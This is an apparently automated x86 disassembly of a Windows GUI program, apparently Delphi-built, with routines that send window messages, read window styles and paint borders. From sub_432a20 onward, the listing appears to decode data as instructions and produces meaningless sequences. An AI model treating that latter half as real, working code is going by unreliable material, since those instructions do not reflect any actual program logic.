call SendMessageA
sub_431bc8
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c68
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431c10
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431c6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d3f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_431738
test al al
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c68
push eax
push 0x0
push 0x467
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_408240
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4408d4
sub_431d48
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_44462c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431dbc
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_44462c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431df8
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_44462c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431e34
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_44462c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431e70
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_44462c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431eac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431f1b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f22
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049d4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049d4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_432174
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c784
mov [ esi + 0x5 ] al
call sub_4313c0
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_4329b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4321c0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_432260
call sub_42c5c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4321f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_432260
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4322a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4321f4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4322f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4321f4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_432334
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_4321f4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43239c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4047e4
push eax
mov eax esi
call sub_4047d4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4321f4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_432400
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_432484
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4324c0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_4324dd ]
jmp [ eax * 4 + jump_table_432546 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43284c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4329a7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_432484
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4322f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_418d68
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_4329d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432a0f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432a16
retn
mov eax [ rw-data ]
call sub_40321c
mov eax rw-data
call sub_403f6c
sub_432a20
insb
sub al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x432b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sub eax [ ebx ]
push edx
sub eax [ ebx ]
adc [ edx ] al
add [ eax ] al
insb
into
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ebp + ecx * 4 + 0x7bdc0044 ] al
inc esp
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_433b30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
cmp al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c ] ah
inc ebx
add [ edx + 0x2000433c ] dl
add al [ eax ]
add [ eax - 0x37 ] dh
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ eax ] al
jpo r-xdata
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
inc ebx
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x780c0044 ] ch
inc ebx
add al cl
js r-xdata
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax - 0x14 ]
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
jpo r-xdata
add al bl
jo r-xdata
inc ebx
add ah dl
jbe r-xdata
add [ eax ] bh
jns r-xdata
mov bl 0xff
cmp [ ebx + 0x43 ] bh
jpo r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add ah cl
jae r-xdata
inc ebx
add [ edi ] al
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
inc ebx
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax - 0x23ffbbbc ] al
jns r-xdata
je r-xdata
add [ ebx + edi * 2 + 0x7bd40043 ] ch
inc ebx
add [ eax ] dh
jl r-xdata
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
add [ eax + 0x7b ] bh
inc ebx
add ah dh
jpo r-xdata
xor [ ebx + eax * 2 ] bh
add [ eax ] cl
jbe r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ eax ] al
jpo r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + edi * 2 + 0x3b ] 0xcd240043
inc ebx
fdivr [ ebx + 0x44 ]
insb
jae r-xdata
add bh bh
clc
jb r-xdata
jpe r-xdata
add [ eax + 0x7c ] ch
inc ebx
add ah bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
push 0xdc00437c
add ah al
jne r-xdata
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x72f8ff00 ] ah
inc esp
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add al [ edx ]
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cld
inc ecx
cmp eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] bl
inc ebx
add [ eax ] ah
add al [ eax ]
add [ ebx + edi ] ch
je r-xdata
fdivr [ edx + 0x43 ]
add [ eax + 0x77 ] dh
inc ebx
add [ eax ] bh
jbe r-xdata
inc ebx
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
sub eax [ eax + eax - 0x8 ]
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax - 0x14 ]
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
sbb al 0x3e
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
insd
jae r-xdata
add al ch
jne r-xdata
push esp
inc ebp
imul esi [ fs : esp + esi + 0x3d ] 0x3ca00043
add al bl
jo r-xdata
inc ebx
add ah dl
jbe r-xdata
add [ eax ] bh
jns r-xdata
inc ebx
add [ edx + eax + 0x34700042 ] ch
and [ edx ] al
add [ eax ] al
sub al 0x3b
outsd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add [ esi + esi * 2 + 0x76d40043 ] bl
bound eax [ ecx ]
add bh bh
sbb al 0x7e
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
xor al 0x3d
inc ebx
add [ eax + 0x4100433c ] ah
add [ eax ] cl
push ebx
je r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add ah cl
jae r-xdata
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
add [ 0x69644554 ] al
je r-xdata
inc ebx
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax - 0x23ffbbbc ] al
jns r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ ecx + edi * 4 + 0x610043 ] ah
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
je r-xdata
inc ebx
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ ss : ecx + edi * 4 + 0x610043 ] ah
add [ eax ] cl
jbe r-xdata
add bh bh
fdivr [ ebp + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x780c0044 ] ch
inc ebx
add al cl
js r-xdata
inc esp
add al bh
shr [ eax ] 0x3e
inc ebx
add [ edi ] al
add eax 0x69644554
je r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax ] al
enter 0x43 0x63
add [ eax ] eax
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
enter 0x43 0x64
add [ eax ] eax
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
inc ebx
add [ ecx ] ah
add ah al
jne r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
pop ecx
insb
dec ecx
jb r-xdata
inc ebx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
cmp eax 0x3ca00043
jb r-xdata
popad
jae r-xdata
add bh bh
inc esp
or al [ eax + eax + 0x60 ]
or al [ eax + eax ]
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
inc ebx
add [ ebx + 0x1 ] ah
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
enter 0x43 0x65
add [ eax ] eax
dec [ esi + edi * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x77 ] dh
inc ebx
add [ eax ] bh
jbe r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x4ff0001 ] ah
jb r-xdata
inc esp
mov dl 0x43
adc [ ecx ] 0x42
add [ eax ] dh
mov edx 0x740043
add bh bh
js r-xdata
ja r-xdata
or al 0x0
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add al ch
jne r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] ch
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
outsd
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
push ebx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x3 ] al
add [ esi + esi * 2 + 0x76d40043 ] bl
adc [ eax ] al
adc [ edx ] eax
add bh bh
cmp [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
